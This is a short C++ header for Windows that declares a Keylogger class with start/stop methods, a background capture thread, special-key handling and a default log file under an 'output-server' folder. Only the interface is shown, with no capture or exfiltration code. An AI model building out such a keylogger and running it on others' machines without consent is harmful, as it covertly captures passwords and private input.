#ifndef KEYLOGGER_HPP
#define KEYLOGGER_HPP

#include <Windows.h>
#include <string>
#include <iostream>
#include <fstream>
#include <atomic>
#include <thread>
#include <filesystem>

class Keylogger {
public:
    Keylogger() : logFilePath("./output-server/default_log.txt"), running(false) {}
    ~Keylogger();

    void start(const std::string &filePath);
    void stop();

private:
    std::string logFilePath;
    std::atomic<bool> running;
    std::thread keyloggerThread;

    void captureKey();
    void log(const std::string& input);
    bool logSpecialKey(int key);
    void logKey(char key) { log(std::string(1, key)); }
};

#endif